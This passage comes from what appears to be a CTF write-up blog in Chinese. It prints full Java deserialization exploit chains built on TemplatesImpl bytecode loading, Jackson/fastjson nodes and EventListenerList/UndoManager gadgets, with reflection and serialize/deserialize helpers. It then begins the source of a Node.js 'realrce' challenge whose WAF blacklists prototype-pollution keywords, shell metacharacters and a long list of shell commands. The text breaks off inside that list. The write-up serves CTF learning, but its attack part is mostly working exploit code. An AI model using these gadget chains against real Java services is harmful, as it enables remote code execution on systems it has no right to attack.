class_">SwingPropertyChangeSupport</span>(<span class="hljs-string">&quot;&quot;</span>));        action.putValue(<span class="hljs-string">&quot;r1&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        action.putValue(<span class="hljs-string">&quot;r2&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">tablefield</span> <span class="hljs-operator">=</span> AbstractAction.class.getDeclaredField(<span class="hljs-string">&quot;arrayTable&quot;</span>);        tablefield.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">atable</span> <span class="hljs-operator">=</span> tablefield.get(action);        <span class="hljs-type">Field</span> <span class="hljs-variable">tablefield1</span> <span class="hljs-operator">=</span> atable.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);        tablefield1.setAccessible(<span class="hljs-literal">true</span>);        Object[] table1 = (Object[])tablefield1.get(atable);        table1[<span class="hljs-number">1</span>] = xstr;        table1[<span class="hljs-number">3</span>] = toStringBean;        tablefield1.set(atable, table1);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr1);        oos1.writeObject(action);        table1[<span class="hljs-number">1</span>] = xstr;        table1[<span class="hljs-number">3</span>] = toStringBean;        tablefield1.set(atable, table1);        System.out.println(serial(action));        deserial(serial(action));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(<span class="hljs-literal">true</span>);        &#125;        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        <span class="hljs-keyword">return</span> field;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;&#125;</code></pre></div><p>内存马就不贴了，看官方WP</p><h4 id="其实这里还能使用另一个链子"><a href="#其实这里还能使用另一个链子" class="headerlink" title="其实这里还能使用另一个链子"></a>其实这里还能使用另一个链子</h4><p><code>EventListenerList</code>，这个还是lolita在<code>MiniL ctf</code>向出题人学的</p><p>这个在之前Neepuctf那个也想用，但是那个禁用了java.util，其中使用到的一个类被检测到了，就没办法</p><p>这里看着应该没问题</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<span class="hljs-keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;<span class="hljs-keyword">import</span> javax.swing.text.StyledEditorKit;<span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.Vector;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;));</span><span class="hljs-comment">//        byte[] bytecodes = Repository.lookupClass(Cmdclass.class).getBytes();</span>        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();        arrayList.add(templatesimpl);        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);        vector.add(jsonNodes);        setValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);        deserial((serial(list)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            field = clazz.getDeclaredField(fieldName);            field.setAccessible(<span class="hljs-literal">true</span>);        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)                field = getField(clazz.getSuperclass(), fieldName);        &#125;        <span class="hljs-keyword">return</span> field;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);        <span class="hljs-keyword">return</span> field.get(obj);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;</code></pre></div><h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">var</span> proc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/images&#x27;</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;/app/static&#x27;</span>));<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_code</span>) &#123;    bypasspin = <span class="hljs-regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;    <span class="hljs-keyword">const</span> bypasscode = bypasspin.<span class="hljs-title function_">test</span>(input_code);    <span class="hljs-keyword">if</span> (bypasscode) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-title function_">waf</span>(<span class="hljs-built_in">decodeURIComponent</span>(input_code));        &#125; <span class="hljs-keyword">catch</span> (error) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error decoding input: &quot;</span>, error);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-regexp">/__proto__/i</span>, <span class="hljs-regexp">/constructor/i</span>, <span class="hljs-regexp">/prototype/i</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> blackword <span class="hljs-keyword">of</span> blacklist) &#123;        <span class="hljs-keyword">if</span> (blackword.<span class="hljs-title function_">test</span>(input_code)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">LockCylinder</span>(<span class="hljs-params">input, blackchr = [<span class="hljs-string">&quot;&amp;&amp;&quot;</span>, <span class="hljs-string">&quot;||&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>]</span>) &#123;    <span class="hljs-keyword">const</span> resultArray = [];    <span class="hljs-keyword">let</span> currentPart = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">const</span> currentChar = input[i];        <span class="hljs-keyword">if</span> (blackchr.<span class="hljs-title function_">includes</span>(currentChar)) &#123;            <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;                resultArray.<span class="hljs-title function_">push</span>(currentPart);                currentPart = <span class="hljs-string">&quot;&quot;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            currentPart += currentChar;        &#125;    &#125;    <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;        resultArray.<span class="hljs-title function_">push</span>(currentPart);    &#125;    <span class="hljs-keyword">return</span> resultArray;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">check_cmd</span>(<span class="hljs-params">cmd</span>) &#123;    <span class="hljs-keyword">const</span> command = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&lt;&gt;&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;if&quot;</span>, <span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-string">&quot;else&quot;</span>, <span class="hljs-string">&quot;elif&quot;</span>, <span class="hljs-string">&quot;fi&quot;</span>, <span class="hljs-string">&quot;case&quot;</span>, <span class="hljs-string">&quot;esac&quot;</span>, <span class="hljs-string">&quot;for&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;while&quot;</span>, <span class="hljs-string">&quot;until&quot;</span>, <span class="hljs-string">&quot;do&quot;</span>, <span class="hljs-string">&quot;done&quot;</span>, <span class="hljs-string">&quot;in&quot;</span>, <span class="hljs-string">&quot;function&quot;</span>, <span class="hljs-string">&quot;time&quot;</span>, <span class="hljs-string">&quot;coproc&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;bind&quot;</span>, <span class="hljs-string">&quot;break&quot;</span>, <span class="hljs-string">&quot;builtin&quot;</span>, <span class="hljs-string">&quot;caller&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;compgen&quot;</span>, <span class="hljs-string">&quot;complete&quot;</span>, <span class="hljs-string">&quot;compopt&quot;</span>, <span class="hljs-string">&quot;continue&quot;</span>, <span class="hljs-string">&quot;declare&quot;</span>, <span class="hljs-string">&quot;dirs&quot;</span>, <span class="hljs-string">&quot;disown&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;enable&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;export&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;history&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;let&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;mapfile&quot;</span>, <span class="hljs-string">&quot;popd&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;pushd&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;readarray&quot;</span>, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;return&quot;</span>, <span class="hljs-string">&quot;set&quot;</span>, <span class="hljs-string">&quot;shift&quot;</span>, <span class="hljs-string">&quot;shopt&quot;</span>, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;suspend&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;times&quot;</span>, <span class="hljs-string">&quot;trap&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;typeset&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;unset&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;vipw&quot;</span>, <span class="hljs-string">&quot;mkdumprd&quot;</span>, <span class="hljs-string">&quot;ifenslave&quot;</span>, <span class="hljs-string">&quot;fsck&quot;</span>, <span class="hljs-string">&quot;chpasswd&quot;</span>, <span class="hljs-string">&quot;useradd&quot;</span>, <span class="hljs-string">&quot;rtstat&quot;</span>, <span class="hljs-string">&quot;lnstat&quot;</span>, <span class="hljs-string">&quot;hwclock&quot;</span>, <span class="hljs-string">&quot;dhclient&quot;</span>, <span class="hljs-string">&quot;pwunconv&quot;</span>, <span class="hljs-string">&quot;groupmems&quot;</span>, <span class="hljs-string">&quot;mksquashfs&quot;</span>, <span class="hljs-string">&quot;chkconfig&quot;</span>, <span class="hljs-string">&quot;ethtool&quot;</span>, <span class="hljs-string">&quot;packer&quot;</span>, <span class="hljs-string">&quot;mkdict&quot;</span>, <span class="hljs-string">&quot;agetty&quot;</span>, <span class="hljs-string">&quot;applygnupgdefaults&quot;</span>, <span class="hljs-string">&quot;zramctl&quot;</span>, <span class="hljs-string">&quot;swaplabel&quot;</span>, <span class="hljs-string">&quot;blkzone&quot;</span>, <span class="hljs-string">&quot;pwconv&quot;</span>, <span class="hljs-string">&quot;cfdisk&quot;</span>, <span class="hljs-string">&quot;ldattach&quot;</span>, <span class="hljs-string">&quot;reboot&quot;</span>, <span class="hljs-string">&quot;tipc&quot;</span>, <span class="hljs-string">&quot;fstrim&quot;</span>, <span class="hljs-string">&quot;clockdiff&quot;</span>, <span class="hljs-string">&quot;groupadd&quot;</span>, <span class="hljs-string">&quot;dmfilemapd&quot;</span>, <span class="hljs-string">&quot;runuser&quot;</span>, <span class="hljs-string">&quot;modinfo&quot;</span>, <span class="hljs-string">&quot;swapoff&quot;</span>, <span class="hljs-string">&quot;telinit&quot;</span>, <span class="hljs-string">&quot;sfdisk&quot;</span>, <span class="hljs-string">&quot;ctstat&quot;</span>, <span class="hljs-string">&quot;clock&quot;</span>, <span class="hljs-string">&quot;rtpr&quot;</span>, <span class="hljs-string">&quot;fsfreeze&quot;</span>, <span class="hljs-string">&quot;ldconfig&quot;</span>, <span class="hljs-string">&quot;fdformat&quot;</span>, <span class="hljs-string">&quot;getcap&quot;</span>, <span class="hljs-string">&quot;kexec&quot;</span>, <span class="hljs-string">&quot;rdma&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;rtmon&quot;</span>, <span class="hljs-string">&quot;rtacct&quot;</span>, <span class="hljs-string">&quot;fdisk&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;usermod&quot;</span>, <span class="hljs-string">&quot;findfs&quot;</span>, <span class="hljs-string">&quot;halt&quot;</span>, <span class="hljs-string">&quot;resizepart&quot;</span>, <span class="hljs-string">&quot;routef&quot;</span>, <span class="hljs-string">&quot;genl&quot;</span>, <span class="hljs-string">&quot;mkswap&quot;</span>, <span class="hljs-string">&quot;poweroff&quot;</span>, <span class="hljs-string">&quot;rdisc&quot;</span>, <span class="hljs-string">&quot;grpunconv&quot;</span>, <span class="hljs-string">&quot;partx&quot;</span>, <span class="hljs-string">&quot;rtcwake&quot;</span>, <span class="hljs-string">&quot;nologin&quot;</span>, <span class="hljs-string">&quot;rfkill&quot;</span>, <span class="hljs-string">&quot;lspci&quot;</span>, <span class="hljs-string">&quot;vigr&quot;</span>, <span class="hljs-string">&quot;grpconv&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;blkdeactivate&quot;</span>, <span class="hljs-string">&quot;addgnupghome&quot;</span>, <span class="hljs-string">&quot;chroot&quot;</span>, <span class="hljs-string">&quot;shutdown&quot;</span>, <span class="hljs-string">&quot;unsquashfs&quot;</span>, <span class="hljs-string">&quot;readprofile&quot;</span>, <span class="hljs-string">&quot;adduser&quot;</span>, <span class="hljs-string">&quot;groupmod&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-string">&quot;dmstats&quot;</span>, <span class="hljs-string">&quot;ifcfg&quot;</span>, <span class="hljs-string">&quot;modprobe&quot;</span>, <span class="hljs-string">&quot;depmod&quot;</span>, <span class="hljs-string">&quot;iconvconfig&quot;</span>, <span class="hljs-string">&quot;sulogin&quot;</span>, <span class="hljs-string">&quot;rmmod&quot;</span>, <span class="hljs-string">&quot;grpck&quot;</span>, <span class="hljs-string">&quot;nstat&quot;</span>, <span class="hljs-string">&quot;ifstat&quot;</span>, <span class="hljs-string">&quot;sysctl&quot;</span>, <span class="hljs-string">&quot;insmod&quot;</span>, <span class="hljs-string">&quot;routel&quot;</span>, <span class="hljs-string">&quot;zdump&quot;</span>, <span class="hljs-string">&quot;blkdiscard&quot;</span>, <span class="hljs-string">&quot;getpcaps&quot;</span>, <span class="hljs-string">&quot;losetup&quot;</span>, <span class="hljs-string">&quot;setpci&quot;</span>, <span class="hljs-string">&quot;dmsetup&quot;</span>, <span class="hljs-string">&quot;wipefs&quot;</span>, <span class="hljs-string">&quot;addpart&quot;</span>, <span class="hljs-string">&quot;zic&quot;</span>, <span class="hljs-string">&quot;userdel&quot;</span>, <span class="hljs-string">&quot;makedumpfile&quot;</span>, <span class="hljs-string">&quot;blkid&quot;</span>, <span class="hljs-string">&quot;groupdel&quot;</span>, <span class="hljs-string">&quot;setcap&quot;</span>, <span class="hljs-string">&quot;chgpasswd&quot;</span>, <span class="hljs-string">&quot;resolvconf&quot;</span>, <span class="hljs-string">&quot;newusers&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;arping&quot;</span>, <span class="hljs-string">&quot;pwck&quot;</span>, <span class="hljs-string">&quot;devlink&quot;</span>, <span class="hljs-string">&quot;lsmod&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;mkfs&quot;</span>, <span class="hljs-string">&quot;faillock&quot;</span>, <span class="hljs-string">&quot;runlevel&quot;</span>, <span class="hljs-string">&quot;blockdev&quot;</span>, <span class="hljs-string">&quot;swapon&quot;</span>, <span class="hljs-string">&quot;alternatives&quot;</span>, <span class="hljs-string">&quot;arpd&quot;</span>, <span class="hljs-string">&quot;delpart&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;chcpu&quot;</span>, <span class="hljs-string">&quot;capsh&quot;</span>, <span class="hljs-string">&quot;ctrlaltdel&quot;</span>, <span class="hljs-string">&quot;bridge&quot;</span>, <span class="hljs-string">&quot;less&quot;</span>, <span class="hljs-string">&quot;gpgsplit&quot;</span>, <span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;localedef&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;gencat&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;ptx&quot;</span>, <span class="hljs-string">&quot;nm&quot;</span>, <span class="hljs-string">&quot;pwmake&quot;</span>, <span class="hljs-string">&quot;zmore&quot;</span>, <span class="hljs-string">&quot;tzselect&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;dnsdomainname&quot;</span>, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;more&quot;</span>, <span class="hljs-string">&quot;journalctl&quot;</span>, <span class="hljs-string">&quot;gunzip&quot;</span>, <span class="hljs-string">&quot;makedb&quot;</span>, <span class="hljs-string">&quot;tac&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;sync&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;locale&quot;</span>, <span class="hljs-string">&quot;prlimit&quot;</span>, <span class="hljs-string">&quot;nisdomainname&quot;</span>, <span class="hljs-string">&quot;timedatectl&quot;</span>, <span class="hljs-string">&quot;ipcmk&quot;</span>, <span class="hljs-string">&quot;isosize&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;taskset&quot;</span>, <span class="hljs-string">&quot;factor&quot;</span>, <span class="hljs-string">&quot;pinky&quot;</span>, <span class="hljs-string">&quot;arch&quot;</span>, <span class="hljs-string">&quot;lscpu&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <span class="hljs-string">&quot;tty&quot;</span>, <span class="hljs-string">&quot;xmllint&quot;</span>, <span class="hljs-string">&quot;xzcmp&quot;</span>, <span class="hljs-string">&quot;readelf&quot;</span>, <span class="hljs-string">&quot;kdumpctl&quot;</span>, <span class="hljs-string">&quot;tsort&quot;</span>, <span class="hljs-string">&quot;nice&quot;</span>, <span class="hljs-string">&quot;cal&quot;</span>, <span class="hljs-string">&quot;rpmdb&quot;</span>, <span class="hljs-string">&quot;newgrp&quot;</span>, <span class="hljs-string">&quot;xmlwf&quot;</span>, <span class="hljs-string">&quot;slabtop&quot;</span>, <span 